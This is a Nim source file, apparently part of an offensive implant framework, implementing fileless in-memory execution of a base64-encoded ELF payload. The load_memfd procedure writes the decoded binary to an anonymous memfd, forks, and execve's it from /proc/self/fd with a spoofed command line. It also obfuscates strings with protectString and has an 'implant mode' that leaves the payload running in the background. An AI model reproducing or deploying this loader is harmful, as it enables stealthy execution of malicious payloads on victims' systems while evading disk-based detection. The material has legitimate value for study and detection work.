import ../../common
import nimprotect
import strutils
import posix
import os

proc execve(pathname: cstring, argv: ptr cstring, envp: cstring): cint {.nodecl, importc: "execve", header: "<stdlib.h>".}
proc memfd_create(name: cstring, flags: cint): cint {.header: "<sys/mman.h>", importc: "memfd_create".}
proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc, header: "unistd.h".}

proc load_memfd*(elf_base64: string, command_line = "test 1 2 3", is_task=false): (bool, string) =
    #[
        Load ELF in memory using memfd_create syscall
        has 2 modes:
            is_task = false: load the elf as a child process and return
            is_task = true: load the elf as a child process, wait on it, and get its output when its done
    ]#

    # only needed if is_task = true
    var redirect_filepath = getTempDir() / "r.o"

    # decode elf buffer
    let elf_buffer = decode_64(elf_base64, is_bin=true, encoding="UTF-8")
    
    # create in-memory/anonymous file and get its file descriptor and path
    let fd = memfd_create("", 0)
    let fd_path = protectString("/proc/self/fd/") & $fd
    # memfd_create failed
    if fd == -1:
        return (false, "")
    
    # write the elf payload to the anonymous file
    var memfd_file: File
    discard open(memfd_file, fd, fmReadWrite)
    write(memfd_file, elf_buffer)

    # fork the process so only the child will execute this
    let pid = fork()
    # fork failed
    if pid == -1:
        return (false, "")

    # father
    if pid > 0:
        # task mode - wait for the child to finish and get output
        if is_task:
            var status: cint
            discard waitPid(cint(pid), status, WUNTRACED)
            var output = readFile(redirect_filepath)
            removeFile(redirect_filepath)
            return (true, output)
        # implant mode - return
        else:
            return (true, "")
    
    # if is_task file path supplied - redirect stdout & stderr to it
    if is_task:
        var redirect_file = open(redirect_filepath, fmWrite)
        discard dup2(redirect_file.getFileHandle(), stdout.getFileHandle())
        redirect_file.flushFile()
        redirect_file.close()

    # child - live and become elf payload
    var fake_process_array = (command_line.split(" ")).allocCStringArray()
    discard execve(fd_path, fake_process_array[0].addr, nil)
    # execve failed (should not return on success)
    return (false, "")
